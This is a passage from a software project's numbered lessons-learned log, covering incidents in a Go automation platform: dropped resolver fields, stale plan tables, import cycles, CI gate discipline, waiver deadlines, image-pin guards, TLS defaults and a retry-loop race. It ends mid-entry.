**What was done.** `summary_fields` is decomposed into its own classified object type (`Nested` lifts an object-valued key into object position, the counterpart to the `Explode` that already existed for arrays). Its keys are now classified individually: the ones that genuinely preview a root-level field stay envelope and say so, and `credentials`, `labels`, `instance_groups`, `created_by` and `recent_jobs` become gaps with owning phases. The measured total moved from 35/97 to 37/110: two more fields carried, thirteen more counted, and a worse number that is a true one.

**Why it generalises.** A conformance suite is not a neutral instrument; it encodes a model of the thing it measures, and where that model is wrong the suite is confidently silent rather than noisy. The specific trap here is the classification that means "ignore this": every such judgement is a place the measurement stops looking, so those are the entries to re-derive whenever new input arrives, not the ones to trust because they were settled early. The tell was available and unread: `related` listed `credentials`, `labels` and `instance_groups` as endpoints, which is the API stating plainly that these are relationships, while the table across the room called the block that previews them envelope.

Two practical rules fall out. When a corpus-driven check classifies a field as not-worth-representing, record what makes it dismissible (here: "previews a root-level field that carries the relationship"), because a dismissal with a stated reason can be falsified by a later example and a bare one cannot. And treat an adversarial input as testing the measurement, not only the system: the fields it newly reports are the cheap half of what it found, and the fields it declines to report are the half worth going to look for.

## 105. A struct returned by a resolver is a checklist, not a report

**What happened.** `launch.Template.Resolve` correctly folds a template's defaults, a saved launch configuration, survey answers and a launch's own overrides into `Resolved.Fields` and `Resolved.ExtraVars`, and every test this package owns for `Resolve` passes. `internal/api/dispatcher.go`'s `LaunchTemplate` calls it, receives `resolved`, and builds a `dispatch.Job` from four of its seven fields. The other three — `Fields`, `ExtraVars`, `AllowSimultaneous` — were read out of the return value and never referenced again, anywhere. Every execution field a template's edit form let an author set (forks, limit, verbosity, tags, extra variables) was, until found this session, resolved correctly and then silently discarded before it reached a job record, the wire, or either execution adapter. `FAILURE_PATTERNS.md` #116 has the full incident.

**Why it generalises.** A resolver and its caller are usually reviewed as one unit while they are being built, and by the time the caller ages away from that context — a later refactor adds a field, a later phase adds a consumer, or simply enough time passes — nobody re-reads the caller's body against the resolver's own type declaration. Every existing test still passes, because the resolver's tests assert against its return value directly (which was always correct) and the caller's tests assert against whatever subset of the return value the caller happens to use (which was also always correct, for that subset). The untested territory is the difference between the two, and no unit test of either half can ever see it, because neither half is wrong on its own.

The generalizable check: when a resolve-and-persist path is declared complete, list every field the resolver's return type declares, and grep for a second reference to each one somewhere downstream of the call site that received it — not "does this code compile and pass its tests," but "does every value this function promised to have computed actually get read by something." A field referenced exactly once, at the point it comes out of the function that computed it, is either genuinely unused (in which case the resolver should not compute it) or silently dropped (in which case this is the bug). The distinguishing question — is anything downstream of here supposed to want this — is not answerable by any test of the resolver, because the resolver was never asked to know who its caller was.

## 106. A concurrency parameter's name matching a field's name does not mean the field controls that concurrency

**What happened.** Closing the rest of AWX_PARITY_ROADMAP.md Section 3b.1 (the wire hop and both adapters for launch fields never reaching execution), the roadmap named "forks" and "limit" among the fields that should reach `internal/adapters/native/adapter.go`'s `Execute`, describing the target as "the engine's own fan-out and per-task controls." `engine.NewExecutor`'s `maxConcurrency` parameter is the only concurrency-shaped knob `Execute` could pass a "forks" value into, and doing so would have compiled, type-checked, and looked identical to the `ExtraVars`/`timeout` wiring that shipped alongside it in the same session.

It would also have had zero observable effect, on every real dispatch, forever. `internal/adapters/native`'s `singleDeviceResolver.Resolve` ignores whatever target string a task names and always returns the one device this Runner invocation was dispatched against, by design: a `wire.DispatchPayload` already names one already-admitted device, and the per-device fan-out that would give "forks" something real to bound happens one layer up, in `internal/dispatch`'s own `Worker` loop, over NATS, never inside one `Execute` call. Every device-targeting task also acquires an exclusive per-device lock before running (`executor.go`'s `runOne`), unconditionally. So even two independent tasks in the same DAG level, both resolving to that one device, would serialize on the lock regardless of `maxConcurrency`'s value. There is no path through this call, for any real dispatch, where more than one action targeting that device is ever in flight at once — the parameter would have been read, stored, and never once made a scheduling difference.

**Why it generalises.** A roadmap or a spec naming a target parameter ("wire X into the engine's own concurrency control") is telling you where a mechanism with that shape already lives in the codebase, not asserting that connecting a new field to it will do anything — the mechanism's own arity at the *specific call site* being changed still has to be checked. The tell here was available without reading a line of `internal/dispatch`: `NewAdapter`'s own doc comment already states this Adapter is scoped to "the one device this payload names," and a resolver with exactly one possible return value can never make a bound on the size of that return value observable, no matter what the bound is set to. Before wiring a resolved field into a parameter that merely shares its name and domain concept with the field (forks ~ concurrency, limit ~ target-set size), trace what that parameter actually bounds at *this* call site, not what it bounds in general or at a different call site in the same codebase — `internal/engine/executor_test.go`'s own `TestExecutor_ConcurrencyBound` proves `maxConcurrency` genuinely works, over eight *devices* one call resolves to; it says nothing about a resolver that can only ever resolve to one. Wiring a real value into a real parameter with a provably absent effect is worse than leaving the field unread and documenting it as inert: on inspection, it reads as fixed.

## 107. A shared-primitive table's "Build by" column is a claim about ordering that its own call sites can falsify, and the first consumer is the one that finds out

**What happened.** `PLAN.md` Section 25 lists the contracts that must have exactly one implementation in this codebase, each with a "Build by" phase and a "Call sites" list. Its "Template renderer" row named Phase 28 as the builder and listed credential injectors first among the call sites. Phase 22 owns credential injectors, and Phase 22 comes first.

An AWX injector document writes every value as a Jinja template over the credential type's own input ids (`{{ api_token }}`), which the committed parity corpus shows directly. So there is no version of Phase 22 that ships injectors without a renderer. Honoring the table as written left exactly two options, and both are defects: build a private renderer inside the credential package, which is the second implementation Section 25 exists to forbid, or ship the phase without its central feature.

The disagreement was not hidden. `IMPLEMENTATION.md` Phase 22's own checklist says "Build the one shared Jinja-compatible renderer with compile-and-cache, consumed later by Phase 28." Phase 28's checklist says "Render messages through the Phase 22 renderer. A second renderer is a gate failure." `AWX_PARITY_ROADMAP.md`'s A2 section lists the renderer among A2's contents. Three documents agreed with each other and only the table disagreed, and the table is the one a reader consults when asking "who builds this."

**Why it generalises.** This is the fourth correction of this exact shape on this one table. Three earlier ones moved the hierarchical policy resolver and the typed generic Registry from Phase 21 to Phase 6, and keyset pagination from Phase 23 to Phase 7. In every case the table named a phase that consumed the primitive prominently rather than the phase that first structurally required it, and in every case the phase's own checklist body already said the right thing. The pattern is stable enough to state as a rule: a summary table that attributes ownership across phases ages against the phase bodies it summarizes, because a phase body gets edited by whoever is doing that phase and the table gets edited by nobody.

The check is cheap and specific. Before consuming a Section 25 primitive, read the "Call sites" column, find the earliest phase named there, and open that phase's own checklist. If the earliest call site's phase precedes the "Build by" phase, the table is stale and correcting it is the first commit of the work, not a documentation cleanup afterwards. `.AGENTS/AGENTS.md`'s Architecture Mismatch and Map Verification Protocol already requires this ("If the map is missing an entry you need, add the entry to the map before you write the code"), and the reason it is worth restating here is that a stale "Build by" does not read like a missing entry. It reads like a decision, and a decision is the thing an implementer is least likely to second-guess.

## 108. A package generated code imports can never import anything that imports the generated code, and the escape hatch is an external test package

**The incident.** Phase 22's plan gave `internal/credtype` an `Artifact.Machine()` returning `credential.Credential`, which required `internal/credtype` to import `internal/credential`. It cannot. `internal/ent` imports `internal/credtype` for its own `field.JSON` column types, and `internal/credential`'s dependency closure reaches `internal/ent` through `internal/crypto`. The import would have closed a four-package cycle and nothing in the module would have built.

The mistake was cheap to catch and would have been expensive to discover late: it was found with one `go list -deps` before any code was written, and would otherwise have surfaced as a compile failure only after the accessor, its callers and its tests existed.

**What made it non-obvious.** `internal/credtype` is a pure domain package with no storage, no encryption and no database, and its own package comment says so. Nothing about reading it suggests it sits *under* the ORM. The dependency runs the other way from how the packages read: the generated code imports the domain type, so the domain type inherits a constraint from a package it has never heard of and would never think to check.

**The consequence, and the recovery.** `Artifact.Machine()` returns the flattened `map[string]string` instead, which turned out to be better anyway: the one consumer assigns it straight to `wire.DispatchPayload.Secrets`, which is already that type, so the accessor removed a conversion rather than adding one. The four key names (`username`, `password`, `private_key_pem`, `passphrase`) are restated in `credtype` rather than imported, following the precedent `internal/catalog/net/catalyst/client.go` already sets for a related reason and which `internal/credential/flatten.go`'s own doc comment already anticipated ("the literal strings are the contract").

A restated contract needs a test holding both halves together, or it drifts, and the drift here is silent in the worst direction: a machine credential injected under a key the transport does not read presents as an authentication failure against the device rather than as a bug in this repository. The test cannot live in either package, because either one importing the other is the cycle. It lives in `credtype_test`, an EXTERNAL test package, which is compiled after both and may import either. That is the general escape hatch and it is worth knowing about before it is needed.

**Rule.** Before importing anything into a package that generated code depends on, run `go list -deps` on the candidate and look for the generated package. When the answer is that the import is impossible, restate the contract and put the agreement test in an external test package (`foo_test`), which is the one place both sides are importable at once.

## 109. A plan's count of what an external system offers is a claim about that system, and the system's own source is the only thing that settles it

**The incident.** The plan for Phase 22's third stage said that roughly twenty of
AWX's managed credential types have injectors that are "pure data", and that shipping
them was therefore a copying exercise. The stage's deliverable was sized around that
number: about twenty types shipped, five declared and not implemented.

The number is wrong, and not marginally. AWX registers twenty-two managed credential
types, and exactly ONE of them has a data injector document this platform can copy.
Seven build their environment in Python through a `custom_injectors` function and
their injector document is empty; two use Jinja control flow that this platform's
renderer refuses by design; twelve declare no injectors at all because something other
than injection consumes them. The stage shipped six types and declared sixteen, which
is close to the inverse of what was planned.

**How it was found, and how nearly it was not.** The plan's claim is plausible. AWX
documents credential types as data, its API returns an `injectors` object for every
one of them, and the public documentation for writing a custom credential type is
entirely about that document. Reading about AWX supports the claim; only reading AWX
refutes it. The refutation took one fetch of
`awx_plugins.credentials.plugins`, which is a file, not an argument.

The failure mode if it had not been checked is the expensive one. The types would have
been transcribed from memory and documentation, they would have validated, they would
have passed every test written against them, and they would have injected environments
that differ from AWX's in ways nobody notices until a customer's playbook authenticates
against the wrong thing. `aws` is the concrete case: transcribed naively it sets
`AWS_SESSION_TOKEN` to the empty string when no session token is configured, and
botocore treats a present-but-empty session token as a credential to use, failing the
request instead of falling back to the access key. A silent authentication failure
attributed to the wrong subsystem, which is precisely what the phase existed to
prevent.

**What changed as a result.** Correcting the map came before the code, per the
Architecture Mismatch protocol, and the correction lives in the package doc of the
thing it governs. The fidelity test also changed shape: for the seven Python types
there is no document to be faithful TO, so faithfulness is measured on the resulting
environment rather than on the document, which is what licensed adding one field AWX
does not have (`Injectors.OmitEmpty`) in order to reproduce a condition AWX expresses
in code.

**The rule.** When a plan quantifies what an external system provides ("about twenty
of its types", "most of its endpoints", "all of these are declarative"), that is a
factual claim about somebody else's code, and it is the kind of claim that is written
from documentation and believed from familiarity. Fetch the authority and count,
before sizing the work around the number. When the count is wrong, the deliverable
changes, and shipping the planned quantity by transcribing from memory produces
artifacts that pass their own tests and are wrong against the system they exist to be
compatible with.

## 110. A gate that is red for a reason unrelated to the diff is still a red gate, and deferring it also blinds every gate behind it

**The incident.** Phase 22c ended with `govulncheck` reporting six standard-library
advisories. The session's handoff recorded this honestly and in detail: the findings
were verified pre-existing by stashing every change and re-running, they were
`go1.26.5` advisories fixed in `go1.26.6`, and they were correctly described as "a
toolchain bump unrelated to this work." Every word of that is true. The branch was
pushed anyway, GitHub Actions ran `make ci` on it, `govulncheck` failed exactly as it
had locally, and the build went red on a commit whose diff had nothing to do with the
finding.

**Why "pre-existing" was the wrong category.** The verification was real and the
conclusion drawn from it was not. Establishing that a finding predates the diff answers
"whose fault is this", which no gate asks. `make ci` asks whether the tree passes now,
and the CI job runs the identical target from the identical `Makefile` against the
identical pinned scanner. There is no reading of "unrelated to this work" under which
that job goes green. The provenance investigation and the push decision were about
different questions, and the answer to the first was allowed to settle the second.

**`govulncheck` specifically has no stable notion of "pre-existing."** The `Makefile`'s
own comment above `GOVULNCHECK_VERSION` says the scanner is pinned but the database is
not: it is fetched from `vuln.go.dev` at run time, by design, "so a newly published
advisory against a dependency still fails CI the day it lands." That cuts in both
directions. It is what makes a red `govulncheck` genuinely not the diff's fault — the
advisory can appear against a tree nobody touched. It is also what makes deferring one
unsafe, because the finding does not age out; the next CI run inherits it, and so does
the next contributor, who now cannot tell their own regression from the carried-over
one. The whole class is cheap to clear: this one was a single character in `go.mod`,
`toolchain go1.26.5` to `go1.26.6`, which took all six findings to zero.

**The part that cost the most information.** `make ci` is a sequential prerequisite
list — `build vet fmt test-race test-integration gosec govulncheck coverage docs-lint
docs-gen-check templ-gen-check` — and stops at the first failure. `govulncheck` sits
ahead of four other checks. The same handoff recorded a *second* known-red item,
`docs-gen-check`, which lives behind it. The CI log therefore reported one problem, not
two, and said nothing whatsoever about `coverage`, `docs-lint`, `docs-gen-check` or
`templ-gen-check` — they never executed. Deferring an early gate does not leave the
later ones passing, it leaves them unobserved, and it converts one red build into a
sequence of them, each revealing the next failure only after the previous is fixed.
(Here the four behind it turned out to be green, which is luck, not evidence: it was
unknowable until `govulncheck` was cleared.)

**The rule.** Do not push with a gate red, whatever the diff's relationship to the
failure. "Pre-existing", "flaky", "unrelated", and "someone else's" are explanations
for a failure, never authorizations to ship past one — the only sanctioned tolerance in
this repository is the explicit, named, written-reason kind (`flaky-packages.json`,
`gosec-waivers.json`), and a finding that fits none of those categories is work, not
context. When a gate is red for a genuinely external reason, fix the external thing or
add it to the waiver file with its reason; both are commits, and both are cheaper than
the red build plus the unobserved gates queued behind it.

## 111. A specification that declares a component and a roadmap that schedules phases can both be complete on their own terms while nothing owns the component

**The incident.** `PLAN.md` Section 18.1 declares three authentication providers:
Local with hashed passwords in the database, plus TOTP and WebAuthn for break-glass
accounts; SAML 2.0 with Just-In-Time provisioning; and a direct LDAP/Active Directory
bind. Phase 8 built the authorization half of Section 18 and federated JWT validation,
and scoped itself out of the rest honestly and in writing. Nothing after it picked the
rest up. Grepping the entire 10,144-line roadmap for `TOTP`, `WebAuthn`, `passkey`,
`bcrypt` and `argon` returned zero hits each. `LDAP` returned zero. `SAML` returned one,
and that one hit was Part XIV noting that a shipped document tells operators to
configure a SAML provider which does not exist anywhere in `internal/`.

**Why neither document could reveal it.** `PLAN.md` is a specification: it says what the
platform is. Its Section 18 is complete, coherent, and correct about what should exist.
`IMPLEMENTATION.md` is a roadmap: it says which phase builds what. Every one of its
eighty-odd phases is a well-formed phase with a real gate. Read either one alone and
nothing is missing, because neither document's structure has a slot for "a thing
declared over there that nothing here claims." A specification has no schedule column
and a roadmap has no unclaimed-requirements section, so the gap lives in the space
between them, where no single reader is standing. This is a different failure from a
stale cross-reference, which at least has two visibly disagreeing statements to compare;
here both statements are true.

**How it was actually found.** Not by reading either document, and not by an audit. By
asking a product question: when can the web UI take a username and a password? That
question has an owner in neither file, so answering it required going to the code, where
`internal/ui/web/auth.go`'s login handler turned out to exchange a PASTED JWT for a
session cookie, with its own doc comment stating that it "adds no new crypto, no
password store, and no second notion of who a caller is." That comment was accurate, and
it was a correct scoping decision by the phase that wrote it. It was also the answer:
there is no password anywhere, and no phase was going to add one. `internal/access`
carried the same fact in its own words, "there is no password here and no phase owns
building one," which had been sitting in the tree unread as a statement of fact rather
than as the alarm it was.

**The cost was already visible in a gate nobody had connected to it.** Phase 20's
Release Gate is `docker compose up` on a clean machine. A clean machine has no token to
paste and nothing on it that could mint one, so the mesh comes up and the operator
cannot get in. That gate had been written, reviewed and carried for many sessions
without anyone noticing it was unreachable, because checking it means asking what a
person does next, and reading it means checking that the sentence is well formed.

**The rule.** Declaring a component and scheduling one are different acts, and the
absence of the second is invisible from either document because both look finished on
their own terms. Do not audit a specification against a roadmap by checking that each
looks complete; audit them by naming a thing a user does end to end and asking which
phase owns every step of it. The step with no owner is the gap, and it will usually turn
out that some file in the tree already states the gap in plain words as a fact about the
world rather than as a problem. When a phase honestly scopes itself out of part of a
specification section, that written-down honesty is not a handoff: the remainder has no
owner until a phase number is attached to it, and "correctly deferred" and "scheduled"
look identical in a diff.

## 112. A debt with a deadline needs the deadline checked against whether the named owner can actually pay it

**The incident.** `gosec-waivers.json`'s header carried this sentence, and had carried
it since the file was created:

> Every entry's backstop is AGENTS.md's own rule: gosec must be validated (zero
> remaining waivers) prior to Phase 20 production packaging.

It reads like exactly the right kind of rule. A waiver is a debt, the file requires a
written reason per entry rather than a blanket suppression, and the header gives every
one of those debts the same due date. Nothing about it looks wrong, and for many
phases nobody looked again.

Phase 20 arrived and the sentence turned out to be unpayable. There are twelve
waivers. Three are the insecure-cookie class that Phase 20 genuinely owns. Seven name
Phase 39 as their re-verifier in their own written reasons, and Phase 39 is not
downstream work waiting to happen: it is CLOSED, with all eleven of its items ticked.
Two more are test-only entries that guard no shipping artifact; each does name an
owner in its own first words, and both of those owners are finished too.

So the header demanded that Phase 20 close nine waivers it had no business closing.
The number nobody had computed was the only number that mattered: how many of the
entries the named phase could actually retire.

**This entry got it wrong twice before getting it right, and that is left visible on
purpose, because the second mistake is better evidence for the rule than the first.**
As first written, this paragraph said EIGHT name Phase 39, which makes three plus
eight plus two equal thirteen against twelve actual entries, and it said Phase 39 was
"in Part VIII, downstream of Phase 20," which is true of its position on the page and
false about its state. Both errors are the identical failure the entry exists to
record: reading a summary instead of counting the entries. The first correction to the
waiver header carried both of them forward and additionally prescribed naming Phase 39
as the owner of the rest, which would have re-parked the debt on a closed phase. None
of it was caught by review; it was caught by an adversarial pass that recomputed every
number from the source. Document order is not execution order, and a phase number is
not evidence that a phase is open.

**Why it went unnoticed.** Each individual waiver was written carefully. Each one names
its owner and its re-verification point, and several have been re-reviewed and updated
across phases exactly as the file's own rules require. The file worked as designed at
the level of an entry. The failure lives one level up, in a summary sentence that was
written once and never re-derived from the entries beneath it, while the entries
underneath it accumulated owners the summary never learned about.

The shape is familiar and is worth naming: a rollup that is authored rather than
computed. A blast radius that a runbook author types by hand goes stale; this project
already decided that one and computes it instead. A waiver deadline is the same thing
in prose, and prose has no `make ci` target.

**What it cost, and what it would have cost.** It cost very little this time, because
Phase 20 re-derived its starting position before writing code and added the entries up.
The cost if it had not: either the phase quietly fails its own Security Analysis item
and somebody waives the waiver rule, or the phase does nine findings' worth of unrelated
hardening to satisfy a sentence, or, most likely and worst, somebody notices the rule
cannot be followed and stops treating the file's rules as binding at all. A rule that
demonstrably cannot be met does not degrade to a weaker rule. It degrades to no rule,
and it takes the credibility of the surrounding rules with it.

**The fix, as it finally landed.** Two things turned out to be true that the first
attempt missed. The zero-waiver bar was never AGENTS.md's rule at all: AGENTS.md says
only "gosec and govulncheck must be validated prior to production packaging (Phase
20)," and the parenthetical "(zero remaining waivers)" was written into Phase 0's
pre-existing-findings policy, copied into the waiver file's header, and attributed in
both places to a document that does not contain it. So the bar was not relaxed by the
phase it gated; a misquotation was struck, in both copies. And the seven orphaned
entries needed a real owner rather than a rescoped sentence, which is why **Phase 82**
was appended to own them and to decide the two test-only ones.

Phase 20's bar is now zero remaining waivers of the cookie class, which it can pay.
Nothing sets a project-wide zero-waiver deadline any more, because no phase owned one.
Every correction is written as a correction, with the original struck rather than
deleted, so the next reader can see that a rule was replaced by a truer one and not
loosened to make a checkbox go green.

One thing the whole episode exposed and nobody had ever counted: this file is the
smaller of two suppression channels. Inline `#nosec` comments account for 55 further
suppressions, so the twelve entries everyone was arguing about are roughly 18% of the
project's suppressed findings. A deadline attached to the visible channel would have
looked satisfiable while the invisible one grew.

**The rule.** When you write a deadline onto a class of debt, name the owner who pays
it and then check that the owner can. Do it by counting the individual entries against
that owner, not by reading the summary sentence, because the summary is what goes
stale. Re-derive the rollup whenever the phase it names comes due; a debt whose due
date nobody can meet is discharged by everybody ignoring it, which is the outcome the
deadline existed to prevent.

---

## 113. A file excluded from the build is excluded from every guard, so it must import shared values rather than copy them

**The incident.** `tools/uidev/main.go` is what `make ui-dev` runs. It carries
`//go:build ignore`, correctly: it is a developer convenience that shells out to docker
and to a compiler, and holding it to the security posture of shipped server code would
mean waiving half a dozen findings that are only findings because it is a tool.

It also held a literal `"nats:2.14.4"` and a literal `"-js"`, under a doc comment
promising it ran "the same NATS image and flags docker-compose.yml uses". When Phase 20
moved the deployment to `nats:2.14.4-alpine` with three flags, the tool kept starting a
different image with one flag, and the promise became a false statement about the
repository's own behavior. `make ci` was green throughout. It had to be: the build tag
removes the file from `go build ./...`, `go vet ./...` and every test, so no guard could
read the string, let alone compare it.

The repository had already solved this problem once, for the same value, in the same
week. `internal/testsupport` exists because the NATS image had been named at seventeen
call sites and drifted into three versions at once, and its package doc says the pin
"lives here rather than at the call site". The one file the compiler could not see was
the one that kept a private copy anyway.

**The rule.** A build tag that hides a file from the compiler hides it from every guard
built on the compiler, and `//go:build ignore` is the strongest form of that: no build,
no vet, no test, no lint. Before writing any shared value into such a file, name the
mechanism that would catch it going stale. "Someone will notice the doc comment is
wrong" is not a mechanism; the doc comment is what goes stale first, and it goes stale
while reading as reassurance.

The tag does not remove the file from the module. It can import `internal/` packages
exactly like anything else, so the fix is an import, not a corrected literal:

```go
args := append([]string{"run", "-d", "--rm", "--name", name,
    "-p", fmt.Sprintf("%d:4222", natsPort),
    testsupport.NATSImage}, testsupport.NATSCommand()...)
```

The general form: a build tag is a statement about how a file is invoked. It is never a
licence to hold a private copy of shared state. If a value is worth centralizing for the
files CI compiles, it is worth centralizing more for the file CI cannot see.

The same reasoning extends past Go. Documentation and deployment descriptors cannot
import a constant either, and are exempted for the same bad reason. Both copies of the
NATS image outside Go, `docker-compose.yml` and `docs/02-get-started.md`, are now read
by tests that compare them against the constants. A file the compiler cannot read is not
a file a test cannot read.

---

## 114. A guard written after an incident is written against that incident's literal, not against the rule

**The incident.** `internal/testsupport` was created because the NATS image had drifted
into three versions across the test suite while `docker-compose.yml` ran a fourth,
`nats:latest`. Its package doc states the rule it encodes: "every image is pinned to an
exact version, never `latest`". `TestPinsAreNotFloatingTags` was written to enforce it,
and enforced this:

```go
if tag := ref[idx+1:]; tag == "latest" || tag == "" {
```

`latest` caused the incident, so `latest` became the test. `PostgresImage` was
`postgres:15-alpine` the entire time, which resolves to whatever 15.x the registry built
most recently and would have moved the whole suite to 15.20 on release day. The guard
would equally have passed `nats:2` and `golang:1`. Three sibling guards written the same
week had the identically shaped hole: a `.dockerignore` check that compared allowances
by exact prefix and so caught `!.SPECIFICATION` while missing `!.S*`, and a compose
check that walked its own two-entry table and never walked the file it had just parsed,
so a newly added service was unchecked in either direction.

**The rule.** A guard written in the aftermath of an incident is written against the
example, and the example is always narrower than the rule. Worse, the surrounding
documentation is written against the rule, so the pair reads as complete: a reviewer
sees a stated rule and a test that appears to enforce it, and stops. That gap is
invisible from the inside precisely because both halves are individually reasonable.

Three habits close it, and none of them is expensive:

1. **Write the rule as a predicate with a name**, separate from the loop over the real
   values. `rejectPin(ref) string` can be tested; an `if` inside a range cannot.
2. **Give the predicate a table containing the near-misses**, not just the incident.
   The rows that matter are the ones a reasonable person would write next:
   `postgres:15-alpine`, `!.S*`, a service added to compose. Include the shapes that
   must still be accepted too, or the next tightening breaks a legitimate pin.
3. **Watch it fail before trusting it to pass.** Reintroduce the regression, run the
   test, see the message, restore. A guard nobody has watched fail is an assertion about
   a guard, not a guard. It also proves the failure message says what to do, which is the
   only part of a test anybody reads under pressure.

Write the rule's known ceiling into the code as well. The version rule accepts a number
anywhere in the tag, so a hypothetical `postgres:alpine3.22` would pass; anchoring it to
the front of the tag was tried and rejected because it rejects `version-10.3_p1-r0`, a
real immutable tag this repository uses. Recording that keeps the next reader from
believing the guard is total.

## 115. An escape hatch has more consumers than setters, and deleting it is one change with the replacement in it

Phase 20b deleted `PLEIADES_UI_INSECURE_COOKIES`, the flag that dropped `Secure` and the
`__Host-` prefix from three cookies for a developer on plain HTTP. The flag was read in
exactly one place, `cmd/controller/main.go`, which made the deletion look like a
five-line change. It was not, and the gap between those two numbers is the lesson.

Reading the flag is not the same as depending on the behavior it selects. Removing it
meant: two setters (`tools/uidev`, `tests/e2e`'s harness), two release gates in
`cmd/controller` that had never set it and started failing at startup because the
replacement is fail-closed, five call sites in `tests/e2e` that used
`http.DefaultClient` against a base URL whose scheme had changed, a compose file, two
user-facing documents, three gosec waivers, one test that asserted the insecure behavior
was correct, and nine test files that constructed the codec with the deleted field. The
way to find that set is not to follow the flag's one reader. It is to make the old
behavior impossible and let the compiler and the gates enumerate the consequences, then
to grep the flag's NAME (which appears in comments, YAML and prose that no compiler
reads) as a second pass.

The other half is that the deletion and its replacement have to be one change. The tree
must never pass through a state where the insecure path is gone and TLS is absent: that
state is not merely inconvenient, it renders a correct password as "Those credentials
were not accepted", because the browser silently refuses the cookie and the CSRF check
then fails against a cookie that never arrived. A refusal that reports the wrong cause is
worse than the missing feature.

And when the escape hatch is removed, its reasoning is not removed with it. The three
deleted writers existed as separate literals because gosec cannot prove a computed
`Secure` field, and a consolidation attempt had already been reverted once for exactly
that reason. That history now lives in a comment on the surviving writer, naming the
mistake not to repeat, because the shape that replaced it looks like it was always this
simple.

## 116. A test harness that publishes a base URL but not a client has hidden the transport at every call site

The end-to-end harness in `tests/e2e` exposed `h.baseURL` and nothing else, so each test
built its own request with `http.Get` or `http.DefaultClient.Do`. That reads as
lightweight, and it is, right up until the transport changes: turning the controller's
listener into a TLS listener was a one-line change to the harness and a five-file change
to its callers, none of which were about what those tests are for.

The fix is to publish the CLIENT, not the address: one `h.httpClient()` that owns the
transport, and a `h.uiClient(t)` that adds a cookie jar to it. Then the trust decision is
made in one place and no test can accidentally dial with verification off, which matters
more than the edit count. The tempting shortcut when a suite starts failing handshakes is
`InsecureSkipVerify: true` at each call site; a harness with one client makes that a
single visible line instead of five invisible ones, and a suite that skipped verification
would keep passing on the day the server presented a certificate it was never configured
with.

The same argument applies to any harness-provided value the tests derive requests from: a
port, a DSN, a base URL. Handing out the raw value distributes a decision; handing out the
thing built from it keeps the decision.


---

## 117. A fail-closed default protects against the mistake a person is making, never against the step they have not reached yet, so read the state it actually refuses before deciding it is the safe choice

Phase 20b made the controller refuse to start when neither `TLS_CERT_FILE`/`TLS_KEY_FILE`
nor `PLEIADES_TLS_TERMINATED_UPSTREAM=1` was set. The reasoning was good and is still in
the code: the session cookie is `Secure` and `__Host-` prefixed, a browser silently
refuses such a cookie on a plain-HTTP origin, and the resulting symptom is "Those
credentials were not accepted" for a correct password. Serving plain HTTP unattended is a
real trap, and the refusal closed it.

It also broke the thing `docker-compose.yml` exists to be. The stack could no longer come
up with one command; it needed `make dev-cert` first, and a fresh reader's first
experience of the product became a startup error naming a variable they had never heard
of. That cost was paid by everyone, on every first run, forever.

The distinction that was missed: an operator who has set NOTHING is not asking for plain
HTTP. They have not reached the question. The refusal was aimed at a decision nobody had
made. The mistake worth failing closed on is the one where somebody states an intention
that is unsafe, or states half of one: both files or neither, never one; a cert pair and
an upstream claim together, never both. Those are still errors and should stay errors,
because each is a written intention that cannot be honored.

The replacement keeps the property the refusal was protecting, which is the test for
whether a default is safe: the controller still never serves plain HTTP unless somebody
says an ingress terminated TLS. It just answers "nothing configured" by provisioning a
self-signed certificate instead of by stopping. The traffic is still encrypted, the cookie
still works, and the thing that was lost by auto-generating (authentication of the server)
is announced at WARN on every single start, naming the settings that restore it.

Two failure modes this pattern has, and how to avoid each. The first is a convenience that
quietly degrades a security property and then goes quiet: it must keep saying so, every
start, at a level somebody receives, and it must name the way out. The second is a
convenience that becomes the deployment: the documentation has to say plainly that it is
not a substitute, in the production guide and not only in a comment.

So the rule is not "prefer fail-closed" or "prefer convenient". It is: name the exact
state your default refuses, decide whether that state is a stated intention or an absence
of one, and only refuse the stated ones. Then check what the refusal costs the person who
has not made a mistake at all, because that cost is real, is paid every time, and is
usually invisible from inside the change that introduces it.

---

## 118. Production-quality logic that lands in a test-support package is invisible debt until a shipped binary needs it, and the fix is a new ordinary package plus an architecture test, never an exception

`internal/testsupport` held `NewServingCert`, which generates a self-signed serving
certificate. That was a reasonable place for it while the only callers were the
end-to-end harness, the development server and a make target. It stopped being reasonable
the moment the controller needed to provision a certificate for itself, and the reason is
not aesthetic: `internal/testsupport` imports `testing`, so a production import links the
testing package into the shipped binary. That registers test flags on the default flag set
and grows the image, in exchange for nothing.

Nothing in the build would have complained. `go build` succeeds, `go vet` succeeds, every
test passes, and the cost only shows up in `go list -deps` on a binary nobody runs that
command against. It is the exact shape of a defect that arrives once and stays: the next
person copies the import because it was already there.

The fix has two halves and both are required. First, move the logic to an ordinary package
(`internal/tlscert`) and have the test-support package CALL it, keeping only its
`testing.TB` convenience wrapper. A delegating wrapper is fine; a second implementation is
not, because a harness whose certificate is built differently from the one the server
presents proves TLS works for a certificate nobody runs. Second, add the rule to
`internal/archtest` so it cannot happen again, alongside the identical rule that already
guarded `internal/auth/authtest`. A Go build tag cannot express this, because a `_test.go`
file cannot be imported across package boundaries at all, which is the whole reason these
packages are not `_test.go` files; a dependency-graph check is the only enforcement left.

Negative-control the new rule before trusting it. A blank import of `internal/testsupport`
into `cmd/controller` made the test fail with the message it was written to produce, and
`go list -deps ./cmd/controller` then really did list `testing`, which is the fact the rule
is about. Both were removed afterwards and both were re-checked. An architecture test that
has never been seen to fail is a comment.

The generalisation: "which package does this live in" is a question about who is allowed to
depend on it, not about who happens to call it today. When the answer changes because a
shipped binary now wants it, moving the code is the cheap half; the test that pins the new
boundary is what makes the move stick.

---

## 119. A retry loop's LAST action decides its failure mode, so a loop that recovers from other writers has to end on a read

**The incident.** `internal/tlscert.Ensure` provisions the controller's serving
certificate. It looped "load what is there; if it cannot be served, generate a
replacement" exactly three times and then returned a fatal error. One controller starting
against an empty directory worked every time. Four starting at the same instant against
one shared volume, which is what a Deployment with replicas or `docker compose up
--scale` does, produced four controllers that all refused to start: every pass read a pair
that another racer had half-replaced, so every pass generated, and the loop's last act was
a write whose result nobody read.

The retry budget was not the problem. Raising three to thirty would have made the window
smaller and left the shape intact. The shape was the problem: the loop ended on the
operation it was retrying, so it reported "I could not make this work" about a resource
that, by then, existed and was perfectly good.

**The rule that came out of it.** When a loop retries because OTHER writers are
interfering, losing a round is not an error condition. It is the strongest evidence
available that the thing being waited for is about to exist. The correct response to
losing is to look again, and the correct last statement of the loop is a read, so that the
answer describes what is actually there rather than what this process failed to do.

Three things follow from it, all of which this same bug demonstrated:

  - Serialize the write with a primitive exactly one racer can win, so that "somebody else
